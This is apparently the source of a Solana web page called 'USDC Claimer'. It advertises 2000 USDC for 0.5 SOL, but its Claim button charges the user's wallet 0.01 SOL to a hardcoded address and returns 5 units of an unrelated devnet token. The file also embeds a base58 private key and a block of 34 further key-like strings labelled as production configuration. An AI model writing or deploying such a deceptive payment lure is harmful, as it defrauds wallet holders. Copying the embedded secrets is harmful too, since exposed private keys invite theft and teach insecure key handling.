/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5XkUCpATYhXWrXAPr3zF8Xr5nUgCWH9wuH3pexZX9aNNUs6qqSmS5twn7ELMVx6h2Q5yP9JfEppWJjh9uiL4MWBL"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2CaAuZY3UosrLYpZ1xM4F78miLKjPJmXPLLrR1qZfMpxkTa3nPPKt5H6jQJZio5a7oKANM79MsZJK9F9FiF4hZdE",
  "key1": "4JcehnvcUvzyFNDftDkdZdK16n9snm9CFca7W1tvBPyNuEHFCc58PhRrhceLJSyYWpxyK4ek1BnajDaAWgxpX1VQ",
  "key2": "66wx46WPps2CNVrdvgNg2vZWmNggcYypuEW7EdtqYGNMoQF2aMXss1kg1EeumYVgXb18T81CGz157nWnwvSaJyXD",
  "key3": "HyPf2VzDRLM4ZYta2XfZLNaMa9ka3EguFcqYEEE2PX7U5Jysjx8CJWHck2Ze7dFPLPcxmd6oRPsSwpGL6CMxiZG",
  "key4": "3bSabA7Qc5f23tyoEL5cBgzThbmZQfkobK8mBTNGKSRvzH9VYwxJDPB7cthGFqrLq6WpCyi9QVH3ggakCQFv1aqk",
  "key5": "5N6jgWy7CPyULWkSHkX81TWjFKFJkb1862xUPnSYVg48PFJvbXNRa2MQetwHT5VhAW9ZM4eGEfx3Ny6rMSbrk2W6",
  "key6": "3s5jCxbudLaVDzHn1nZm3PstdKPbEYdJezcC2pWgAQdA8dsY7GoR7X3qibbwhmt4ADE5RzbgEDVcjtdiXzPD2ibG",
  "key7": "4eno9a9unFD8zq2aCxxbj8R65XBkqJgFttx1wanpZPV5PbAH3KD16PwuqAQyV3zdJtu64SKWPV1ErEosXckCRJDZ",
  "key8": "3fVUg7c7MB2SfLccQYt55xwdMm8K5oXY6taTwycDpJoYtBvnPDfPohyhxfQPmJWRie1W5pkDoHvpef4z9Y9wgZwB",
  "key9": "P1Uau38yES4dkmjt5HTDKQRj8xCqTSZgRuPQjLvgwRfS6whMBDs5jfm9rAQq2tS8JDBHgQ62t4yDAUBpwSUMrWR",
  "key10": "QccGEZvHGdJJm1AWVWpDqSPBPFij3CFEsDAgYH7nk2kaP2UpM5JfwowtuB4uq6KFR4R2do9Fr7mpmKqQRJrPSS3",
  "key11": "2SUGpFQAez7toMCGUZnVpWtqtWfGTdetbdJmXGLjqTAHd3t8nm4TbmGxuUz9hkZ8sg2zCJ92Rc8tcd6wUGK96irg",
  "key12": "26LWiHRkEK7MyN45pojuEBAUc536CoWKBXVH2DhFyyCbETkpsmxi7Sit36JRz4LxovsgkbrRRFHp7wiq1FmtSwi8",
  "key13": "3KC8GUCzhvd3cWWAFBcUqFMCFVwkMkbT8oCondPM58nTb61bP4xLxT75SUvUFeLG6ApWhr5fR8cQE5Fir7CeDNuS",
  "key14": "299Qxq9xnYhmpEK3MHp8fkBki23iQBM5CHmDksWe5V8EdkYhBPdf6bBNHhrkFf5mehJGk9UkZaiTXoYKuj2okkBV",
  "key15": "2s3RVZA6K2JAPne3PgXrVFWmeNCkNchvqcXxRvfxDKTmo75JLPWPYKvWQR6VUXHwXWUUUL8Y4WVKmYq1DmHQny7s",
  "key16": "3FJFPnbtqc3bpej1KWkygTiUP8wbbdqeKYd7CuQt4Bpk8mD7JBfLmRPKSa36VGRGLDzzwP3LWQkctTWMDvuVhBei",
  "key17": "587m1FVGfno5SXfveWTYu7BzupW4HtNy3Hmhhn4Q2GsgKZQn1FsQP1SvTV87qhgaTjAFDcmjs37q47eEFRcDaSgQ",
  "key18": "21E6FkJJ78qoxDxxu9V4aowG3gU2PCmaFzqdKvBkKy4haBRNkPSazE5KebjrrsjUmUoDgtkmLWJPujZCJrhXqqfV",
  "key19": "3kdH6cNFz5vPAr2c5nzkfZ4xstJjBiRQMw5FhjZnGwPb7Jt4vH8nH3T1UtTGdmxsCLASjDc3kBzrcPiQAHNA15PY",
  "key20": "5jx6K6G6Ww5tq83YhSXqH8aaVj9ZPKWxunvzwsji425yKR73o3PwemqTx1N9kfMkZQEmLzGdLEFAQxcfXggq6VaH",
  "key21": "43KJXxxhxutx6bxUik3a65BaS3QiDeYCusGropiRj3EAbosFHCPSmcvHBhPfeD9KE35mGCBMngozKKerGeZQXjQU",
  "key22": "tdvHF3kk6kvRqRKWeSfum27LrVbDMLnCLUJs6G6wemGzZXzPukJeVQaNDJjtxnKyfdqsyWAZ9hK4iLStdNfkGR3",
  "key23": "51RgQPxNebbRigp6mwJy4RgJzGsLCUQBxh3dPcFi2GaC6jPWv9PZHDE77TXYTiyCGgLymMf3SUo3VDUTW6QnYn3r",
  "key24": "32SqEvGb2tuJ2BgJBFy7DixrTdtXcQ9184MAj29LPY1VeWhUYe6czPiA4ur7uWFejtNQGaQ7wjTTaecSAUF64ubN",
  "key25": "3ihjn6TxpNGje7CyZUghXQKxZojXiFyofTb3E1SGfc2h2f3hAHs4YcNMuL5xS1qrsQ3oPnRwvgTFhR4ZtYjHfbBJ",
  "key26": "5yyt8kQBeqkpvS38txn3KbosaLpRQCJcjZRTeZSb7HveTivEqoeG5qeAS658WXRexQZ9a6yvrjsHFfT6fU1q8oy",
  "key27": "5taNsx3XFsUkSKfJE5PyRtbwndQUrG7vdNBhRMa1fTYoMmzqrSiwXFNDoow673dZcBWJwBUYtJano5yDrmxVvzZ8",
  "key28": "65Zu75gK6qDDMF3iUh8fMSSKH6ADG12kvettasm8y35gPfAZJvVpPADFjrCMcR5Hk8UFCbW4oTcAd2bdHcGyRrZG",
  "key29": "4MnXR5Z72qZj5eQRwkd4xXWvFn2Jz6EiyVQa5hRiKAxxkunXXjdDkG1xS7R3P5kg47HvS9i2X561Sbdo59KsK5rg",
  "key30": "3PiTBqJNE4dzipFC5EPVSe3GdwbBYdRQZq3opBa1rKuZb9XErpfTmjkETmkS3nWJA3uGUa4F3RTd6ekbPv3BGHzW",
  "key31": "5eYbYfpYEo9B6peKGdvWFSb8twPBznQT8eA1acWjRjsN7Cz7VQQSNh8Xx3raAzT7L9B1hkvVs84yo3YXtXTdESfq",
  "key32": "4PbUq5rkukCmWyc4s4Hpo6ngJNqBvqdurVt4qjWSTgLzNWk9CmSRC75srfKryBYvb3np7kcNdq8qmeU9Ro2yEmZ7",
  "key33": "Rkbqfh9dePo6rEhuM8VJ2okQ2kASNpbi5bcKAfUAE177rjRWbXrk8wAjMpBjjGUZzYVSVwC7EALs6PARWSvG3MJ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
